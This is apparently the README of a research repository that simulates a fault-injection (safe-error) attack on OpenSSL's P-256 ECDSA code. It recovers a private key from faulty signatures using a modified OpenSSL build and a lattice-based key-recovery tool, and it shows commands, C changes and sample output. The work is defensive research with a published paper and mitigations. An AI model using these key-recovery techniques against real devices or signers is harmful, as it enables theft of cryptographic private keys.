# Exploiting dummy codes in Elliptic Curve Cryptography implementations

Some implementations of Elliptic Curve Cryptography rely on dummy point additions to make the implementation constant-time with a regular behaviour.
Fault injection attacks can reveal if a dummy point addition occured thus revealing values of secret key bits (those are called *C safe-error* attacks).

We provide Python scripts to simulate such an attack to recover an ECDSA private key on an implementation of the popular curve P-256 in OpenSSL, with all the mathematical tools in the script `ec.py` that can be used as a blackbox.

This is done purely as a research project. We recall here that this kind of attack is not in the scope of the OpenSSL threat model according to their [security policy](https://www.openssl.org/policies/secpolicy.html). Our goal is to show that it can be dangerous to use a cryptographic library that is not protected against physical attacks in the context of embedded devices or when a malicious person could have access to the device performing cryptographic operations.

This project is licensed under the terms of the MIT license.

## Requirements

The script has been written for Python 3. It requires the installation of `fpylll` with the command `pip install fpylll`, but first there might be the need to install other dependencies (see https://pypi.org/project/fpylll/ for information).

## Attack simulation

The script `openssl_p256_attack_simulation.py` generates signatures using an altered OpenSSL binary such that a computational fault is made during the computation of an ECDSA signature.

Then the second script `p256_privatekey_recovery.py` checks the signatures and try to retrieve the private key when enough valid signatures are collected, using the mathematical tools of `ec.py`.

We first give an example how to run the simulation, and then we explain how we modified OpenSSL to simulate the fault.

### Running an example

Using a valid openssl binary, a key pair on curve P-256 can be generated using these commands:
```shell
$ openssl ecparam -genkey -name prime256v1 -out privatekey.pem
$ openssl ec -in privatekey.pem -pubout -out publickey.pem
```

To launch the simulation, run the following command:
```shell
$ ./openssl_p256_attack_simulation.py /path/to/altered/openssl privatekey.pem /path/to/signatures number_of_signatures
```
Where the arguments are
- `/path/to/altered/openssl`: the modified openssl binary to simulate the fault;
- `privatekey.pem`: the private key to sign the messages;
- `/path/to/signatures`: directory where the signatures will be stored;
- `number_of_signatures`: number of signatures to generate.

Then, the key can be recovered with the second script:
```shell
$ ./p256_privatekey_recovery.py publickey.pem /path/to/signatures
```
Where the arguments are
- `publickey.pem`: the corresponding public key, used to check signatures and if the guessed private key is correct;
- `/path/to/signatures`: directory where the signatures are stored.

We give an example below with its output:
```shell
$ ./openssl_p256_attack_simulation.py ./openssl_altered privatekey.pem TEST 2200
Signatures and messages will be stored in the directory TEST
Generating 2200 signatures with fault in last point addition...
  ... done
$
$ ./p256_privatekey_recovery.py publickey.pem TEST
Nb valid signatures:  1 /   74
Nb valid signatures:  2 /  107
Nb valid signatures:  3 /  134
(...)
Nb valid signatures: 51 / 1516
Nb valid signatures: 52 / 1570
Recovering the key, attempt 1 with 52 signatures...
Nb valid signatures: 53 / 1612
Recovering the key, attempt 2 with 53 signatures...
Nb valid signatures: 54 / 1640
Recovering the key, attempt 3 with 54 signatures...
SUCCESS!
The private key is: 5f3e2c2d115fcc3e2e58049746b6c89d8ecb056690247590490b31136c3bda5c
Nb signatures valid: 54
Nb signatures total: 1640
```

It can be checked that the private key is indeed correct using the following command:
```shell
$ openssl ec -in privatekey.pem -text -noout
read EC key
Private-Key: (256 bit)
priv:
    5f:3e:2c:2d:11:5f:cc:3e:2e:58:04:97:46:b6:c8:
    9d:8e:cb:05:66:90:24:75:90:49:0b:31:13:6c:3b:
    da:5c
pub: 
    04:ab:28:be:3d:17:6f:b0:44:bb:f7:44:51:fb:39:
    0b:4d:9c:b6:4a:18:ec:f1:5b:69:9d:e3:87:ea:e4:
    c6:7d:bd:73:26:10:11:22:af:92:b0:aa:d1:0c:ab:
    f7:a6:83:f1:ef:4f:48:10:c2:00:b2:b6:ce:c4:0b:
    b4:bf:3d:65:47
ASN1 OID: prime256v1
NIST CURVE: P-256
```



### Modifying OpenSSL for fault simulation

Several implementations of the curve P-256 are present in OpenSSL. Our target is the one present in the file [ecp_nistz256.c](https://github.com/openssl/openssl/blob/master/crypto/ec/ecp_nistz256.c) that is based on [this work](https://eprint.iacr.org/2013/816) and is present since version 1.0.2 of OpenSSL.
It is the default version if the option `no-asm` is **not** specified at compilation, and for several architectures (x86_64, x86, ARMv4, ARMv8, PPC64, SPARCv9).

We made two following modifications in the file [ecp_nistz256.c](https://github.com/openssl/openssl/blob/master/crypto/ec/ecp_nistz256.c). One to introduce a fault on the elliptic curve point addition, and another so that this modification impacts only the last point addition that occurs during the execution.

#### Point addition

The point addition is implemented in assembly, generated from the perl scripts in https://github.com/openssl/openssl/tree/master/crypto/ec/asm. However, to simulate the attack, we used the implementation reference in the file [ecp_nistz256.c](https://github.com/openssl/openssl/blob/master/crypto/ec/ecp_nistz256.c) that is called `ecp_nistz256_point_add_affine` that implements the same formulas and has the same characteristics of interest for our attack. We added an instruction to simulate a "random" fault during the elliptic curve point addition:
```c
static void ecp_nistz256_point_add_affine_faulty(P256_POINT *r,
                                                 const P256_POINT *a,
                                                 const P256_POINT_AFFINE *b)
(...)
ecp_nistz256_sqr_mont(Z1sqr, in1_z);        /* Z1^2 */
Z1sqr[0] ^= 123456789; // "random" fault
``` 

#### Scalar multiplication algorithm

The scalar multiplication algorithm used in this implementation is given in the function `ecp_nistz256_points_mul`. We added the call to the faulty addition instead of the regular one in the last iteration of the loop:

```c
for (i = 1; i < 37; i++) {
  unsigned int off = (idx - 1) / 8;
  wvalue = p_str[off] | p_str[off + 1] << 8;
  wvalue = (wvalue >> ((idx - 1) % 8)) & mask;
  idx += window_size;

  wvalue = _booth_recode_w7(wvalue);

  ecp_nistz256_gather_w7(&t.a, preComputedTable[i], wvalue >> 1);

  ecp_nistz256_neg(t.p.Z, t.a.Y);
  copy_conditional(t.a.Y, t.p.Z, wvalue & 1);

  if (i == 36) {
    ecp_nistz256_point_add_affine_faulty(&p.p, &p.p, &t.a);
  }
  else {
    ecp_nistz256_point_add_affine(&p.p, &p.p, &t.a);
  }
}
```

### Compiling the modified OpenSSL

The steps to compile the modified OpenSSL are
```shell
$ ./config --prefix=/path/to/alteredopenssl --openssldir=/path/to/alteredopenssl
$ make
$ make install_sw
```
where the path is where the modified OpenSSL should be installed.

You might checked that the compiled `libcrypto` library in `/path/to/alteredopenssl/lib` is linked to the OpenSSL binary `/path/to/alteredopenssl/bin/openssl`. To verify, on Linux:
```shell
$ ldd /path/to/alteredopenssl/bin/openssl
```
And on Mac:
```shell
$ otool -L /path/to/alteredopenssl/bin/openssl
```
If it is not the case, you can link the library before running the simulation with the command
```shell
$ export LD_LIBRARY_PATH=/path/to/alteredopenssl/lib
```




## How to use the tool in general

The script `ec.py` can be used in other settings, when a list of signatures where the nonces of the signatures are known to have the least or most significants bits set to *0*.


### Finding the key from signatures

The main tool is the function `findkey` that retrieves a private key given signatures generated from nonces that have their *l* most (or least) significant bits set to *0*:
```python
findkey(curve, pubkey_point, signatures, msb, l)
```
where

* `curve`: an instance of the class curve (see below for more details);
* `pubkey_point`: the public key of the signer, given as two integers *(x,y)*;
* `signatures`: list of signatures of the form *(m, r, s)* where *m* is the integer representing the hash the message, and *(r,s)* the two components of the signature.
* `msb` and `l`: those parameters tell if the `l` most significant bits (`msb=True`) or `l` significant bits (`msb=False`) of the nonces in each signature are set to *0*.

A class `Curve` is implemented for elliptic curve computation. Predefined curves are present : `secp192r1`, `secp224r1`, `secp256r1`, `secp384r1`, and `secp521r1` which correspond to the NIST curves P-192, P-224, etc. Other curves can easily be used by giving explicit parameters:
```python
curve = Curve(p, a, b, q, x0, y0)
```
It corresponds to a curve defined by the equation *y<sup>2</sup> = x<sup>3</sup> + ax + b* over the prime field *GF(p)*, and *(x<sub>0</sub>, y<sub>0</sub>)* is the base point or order *q*.

We warn that the values of the public key and the signatures must be given as integers. This can be done easily in Python3 to convert a sequence of bytes into an integer with the `int.from_bytes` method. For example, to convert a file into an integer if the hash function is `sha256`:
```python
int.from_bytes(sha256(open(filename, 'rb').read()).digest(), 'big')
```


### Checking signatures

To check a signature on a curve, the function `check_signature` can be used:
```
check_signature(curve, pubkey_point, signature)
```
where

* `curve`: an instance of the class curve such as `secp256r1`;
* `pubkey_point`: the public key of the signer, given as two integers *(x,y)*;
* `signature`: the signature to be checked given as the values *(m, r, s)* where *m* is the integer representing the hash the message, and *(r,s)* the two components of the signature.



## Why it works

Details and mitigations are given in the paper on the [SSTIC website](https://www.sstic.org/2020/presentation/exploiting_dummy_codes_in_elliptic_curve_cryptography_implementations/).